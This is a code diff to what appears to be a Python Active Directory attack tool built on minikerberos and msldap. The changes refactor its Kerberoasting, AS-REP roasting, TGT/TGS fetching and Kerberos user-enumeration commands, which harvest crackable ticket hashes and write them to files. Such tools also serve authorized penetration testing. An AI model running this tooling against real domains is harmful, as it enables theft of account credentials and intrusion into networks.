@@ -1,37 +1,25 @@
-#!/usr/bin/env python3
-#
-# Author:
-#  Tamas Jos (@skelsec)
-#
-
-
-from msldap.ldap_objects.aduser import MSADUser, MSADUser_TSV_ATTRS
-from msldap.commons.factory import LDAPConnectionFactory
-from msldap import logger as msldaplogger
-
-from asyauth.protocols.kerberos.gssapi import KRB5_MECH_INDEP_TOKEN
-
-from minikerberos import logger as kerblogger
-from minikerberos.security import KerberosUserEnum, APREPRoast, Kerberoast
-
-from minikerberos.common.url import KerberosClientURL, kerberos_url_help_epilog
-from minikerberos.common.spn import KerberosSPN
-from minikerberos.common.creds import KerberosCredential
-from minikerberos.common.target import KerberosTarget
-from minikerberos.aioclient import AIOKerberosClient
-from minikerberos.common.utils import TGSTicket2hashcat
-from minikerberos.protocol.asn1_structs import AP_REQ, TGS_REQ
-
 import asyncio
 import ntpath
 import logging
-import getpass
 import os
 import csv
 import platform
 import sys
-from urllib.parse import urlparse, parse_qs
 import datetime
+
+
+from msldap.ldap_objects.aduser import MSADUser_TSV_ATTRS
+from msldap.commons.factory import LDAPConnectionFactory
+from msldap import logger as msldaplogger
+
+from minikerberos import logger as kerblogger
+from minikerberos.security import asreproast, kerberoast, krb5userenum
+from minikerberos.common.factory import KerberosClientFactory, kerberos_url_help_epilog
+from minikerberos.common.spn import KerberosSPN
+from minikerberos.common.creds import KerberosCredential
+from minikerberos.common.target import KerberosTarget
+from minikerberos.common.utils import TGSTicket2hashcat
+
 
 
 kerberoast_epilog = """==== Extra Help ====
@@ -171,16 +159,16 @@ async def run_auto():
 			cred.domain = domain
 			
 			spn_users.append(cred)
-			
-		for cred in asrep_users:
-			results = []
-			ks = KerberosTarget(domain)
-			ar = APREPRoast(ks)
-			try:
-				res = await ar.run(cred, override_etype = [23])
-				results.append(str(res))	
-			except Exception as e:
-				print("asreproast for user %s failed. Reason: %s" % (cred, e))
+		
+		asrepusernames = [x.username for x in asrep_users]
+		asrepdomain = asrep_users[0].domain
+		async for username, h, err in asreproast(KerberosTarget(domain), asrepdomain, asrepusernames, override_etype = [23]):
+			if err is not None:
+				errors.append((username,err))
+			else:
+				asrep_cnt += 1
+				results.append(str(h))
+		
 		filename = 'asreproast_%s_%s.txt' % (logon['domain'], datetime.datetime.utcnow().strftime("%Y%m%d_%H%M%S"))
 		with open(filename, 'w', newline = '') as f:
 				for thash in results:
@@ -220,14 +208,12 @@ async def run_auto():
 async def amain(args):
 	if args.command == 'tgs':
 		logging.debug('[TGS] started')
-		ku = KerberosClientURL.from_url(args.kerberos_connection_url)
-		cred = ku.get_creds()
-		target = ku.get_target()
-		spn = KerberosSPN.from_user_email(args.spn)
+		ku = KerberosClientFactory.from_url(args.kerberos_url)
+		spn = KerberosSPN.from_upn(args.spn)
 
 		logging.debug('[TGS] target user: %s' % spn.get_formatted_pname())
 		logging.debug('[TGS] fetching TGT')
-		kcomm = AIOKerberosClient(cred, target)
+		kcomm = ku.get_client()
 		await kcomm.get_TGT()
 		logging.debug('[TGS] fetching TGS')
 		await kcomm.get_TGS(spn)
@@ -237,14 +223,14 @@ async def amain(args):
 
 	elif args.command == 'tgt':
 		logging.debug('[TGT] started')
-		ku = KerberosClientURL.from_url(args.kerberos_connection_url)
+		ku = KerberosClientFactory.from_url(args.kerberos_url)
 		cred = ku.get_creds()
 		target = ku.get_target()
 
 		logging.debug('[TGT] cred: %s' % cred)
 		logging.debug('[TGT] target: %s' % target)
 
-		kcomm = AIOKerberosClient(cred, target)
+		kcomm = ku.get_client()
 		logging.debug('[TGT] fetching TGT')
 		await kcomm.get_TGT()
 		
@@ -254,21 +240,23 @@ async def amain(args):
 	elif args.command == 'asreproast':
 		if not args.targets and not args.user:
 			raise Exception('No targets loaded! Either -u or -t MUST be specified!')
-		creds = []
 		targets = get_targets_from_file(args, False)
 		targets += get_target_from_args(args, False)
 		if len(targets) == 0:
 			raise Exception('No targets were specified! Either use target file or specify target via cmdline')
 
+		
+		usernames = [x.username for x in targets]
+		domain = targets[0].domain
+
 		logging.debug('[ASREPRoast] loaded %d targets' % len(targets))
 		logging.debug('[ASREPRoast] will suppoort the following encryption type: %s' % (str(args.etype)))
 
 		ks = KerberosTarget(args.address)
-		ar = APREPRoast(ks)
 		hashes = []
-		for target in targets:
-			h = await ar.run(target, override_etype = [args.etype])
-			hashes.append(str(h))
+		async for _, h, err in asreproast(ks, usernames, domain, args.etype):
+			if h is not None:
+				hashes.append(str(h))
 
 		if args.out_file:
 			with open(args.out_file, 'w', newline = '') as f:
@@ -302,11 +290,12 @@ async def amain(args):
 
 		logging.debug('Kerberoast will suppoort the following encryption type(s): %s' % (','.join(str(x) for x in etypes)))
 		
-		ku = KerberosClientURL.from_url(args.kerberos_connection_url)
-		cred = ku.get_creds()
-		target = ku.get_target()
-		ar = Kerberoast(target, cred)
-		hashes = await ar.run(targets, override_etype = etypes)
+		ktargets = [x.username for x in targets]
+		kdomain = targets[0].domain
+		ku = KerberosClientFactory.from_url(args.kerberos_url)
+		hashes = []
+		async for username,h, err in kerberoast(ku, ktargets, kdomain, etypes):
+			hashes.append(h)
 
 		if args.out_file:
 			with open(args.out_file, 'w', newline = '') as f:
@@ -321,23 +310,21 @@ async def amain(args):
 
 	elif args.command == 'brute':
 		target = KerberosTarget(args.address)
+		enumusers = []
+		targets = get_targets_from_file(args, False)
+		targets += get_target_from_args(args, False)
 
-		with open(args.targets, 'r') as f:
-			for line in f:
-				line = line.strip()
-				spn = KerberosSPN()
-				spn.username = line
-				spn.domain = args.realm
-				
-				ke = KerberosUserEnum(target, spn)
-			
-				result = await ke.run()
-				if result is True:
-					if args.out_file:
-						with open(args.out_file, 'a') as f:
-							f.write(result + '\r\n')
-					else:
-						print('[+] Enumerated user: %s' % str(spn))
+		enumusers = [x.username for x in targets]
+
+		async for username, result, _, err in krb5userenum(target, enumusers, args.realm):
+			if err is not None:
+				continue
+			if result is True:
+				if args.out_file:
+					with open(args.out_file, 'a') as f:
+						f.write(username + '\r\n')
+				else:
+					print('[+] Enumerated user: %s' % str(username))
 
 		logging.info('Kerberos user enumeration complete')
 
@@ -400,11 +387,11 @@ async def amain(args):
 			basefile = ntpath.basename(args.out_file)
 
 		if args.type in ['spn','all']:
-			logging.debug('Enumerating SPN user accounts...')
+			print('Enumerating SPN user accounts...')
 			cnt = 0
 			if args.out_file:
 				with open(os.path.join(basefolder,basefile+'_spn_users.txt'), 'w', newline='') as f:
-					async for user in client.get_all_service_users():
+					async for user, err in client.get_all_service_users():
 						cnt += 1
 						f.write('%s@%s\r\n' % (user.sAMAccountName, domain))
 			
@@ -416,7 +403,7 @@ async def amain(args):
 					cnt += 1
 					print('%s@%s' % (user.sAMAccountName, domain))
 			
-			logging.debug('Enumerated %d SPN user accounts' % cnt)
+			print('Enumerated %d SPN user accounts' % cnt)
 
 		if args.type in ['asrep','all']:
 			logging.debug('Enumerating ASREP user accounts...')
@@ -532,7 +519,7 @@ def main():
 
 
 	spnroast_group = subparsers.add_parser('spnroast', help='Perform spn roasting (aka kerberoasting)',formatter_class=argparse.RawDescriptionHelpFormatter, epilog = kerberos_url_help_epilog)
-	spnroast_group.add_argument('kerberos_connection_url', help='Either CCACHE file name or Kerberos login data in the following format: <domain>/<username>/<secret_type>:<secret>@<dc_ip_or_hostname>')
+	spnroast_group.add_argument('kerberos_url', help='Either CCACHE file name or Kerberos login data in the following format: <domain>/<username>/<secret_type>:<secret>@<dc_ip_or_hostname>')
 	spnroast_group.add_argument('-t','--targets', help='File with a list of usernames to roast, one user per line')
 	spnroast_group.add_argument('-u','--user',  action='append', help='Target users to roast in <realm>/<username> format or just the <username>, if -r is specified. Can be stacked.')
 	spnroast_group.add_argument('-o','--out-file',  help='Output file base name, if omitted will print results to STDOUT')
@@ -545,21 +532,12 @@ def main():
 	spnroastsspi_group.add_argument('-o','--out-file',  help='Output file base name, if omitted will print results to STDOUT')
 	spnroastsspi_group.add_argument('-r','--realm', help='Kerberos realm <COMPANY.corp> This overrides realm specification got from the target file, if any')
 	
-	multiplexorsspi_group = subparsers.add_parser('spnroast-multiplexor', help='')
-	multiplexorsspi_group.add_argument('-t','--targets', help='File with a list of usernames to roast, one user per line')
-	multiplexorsspi_group.add_argument('-u','--user',  action='append', help='Target users to roast in <realm>/<username> format or just the <username>, if -r is specified. Can be stacked.')
-	multiplexorsspi_group.add_argument('-o','--out-file',  help='Output file base name, if omitted will print results to STDOUT')
-	multiplexorsspi_group.add_argument('-r','--realm', help='Kerberos realm <COMPANY.corp> This overrides realm specification got from the target file, if any')
-	multiplexorsspi_group.add_argument('mp_url', help='Multiplexor URL in the following format: ws://host:port/agentid or wss://host:port/agentid')
-	
-
-
 	tgt_group = subparsers.add_parser('tgt', help='Fetches a TGT for the given user credential',formatter_class=argparse.RawDescriptionHelpFormatter, epilog = kerberos_url_help_epilog)
-	tgt_group.add_argument('kerberos_connection_url', help='Either CCACHE file name or Kerberos login data in the following format: <domain>/<username>/<secret_type>:<secret>@<dc_ip_or_hostname>')
+	tgt_group.add_argument('kerberos_url', help='Either CCACHE file name or Kerberos login data in the following format: <domain>/<username>/<secret_type>:<secret>@<dc_ip_or_hostname>')
 	tgt_group.add_argument('out_file',  help='Output CCACHE file')
 	
 	tgs_group = subparsers.add_parser('tgs', help='Fetches a TGT for the given user credential',formatter_class=argparse.RawDescriptionHelpFormatter, epilog = kerberos_url_help_epilog)
-	tgs_group.add_argument('kerberos_connection_url', help='Either CCACHE file name or Kerberos login data in the following format: <domain>/<username>/<secret_type>:<secret>@<dc_ip_or_hostname>')
+	tgs_group.add_argument('kerberos_url', help='Either CCACHE file name or Kerberos login data in the following format: <domain>/<username>/<secret_type>:<secret>@<dc_ip_or_hostname>')
 	tgs_group.add_argument('spn',  help='SPN strong of the service to get TGS for. Expected format: <domain>/<hostname>')
 	tgs_group.add_argument('out_file',  help='Output CCACHE file')
 	
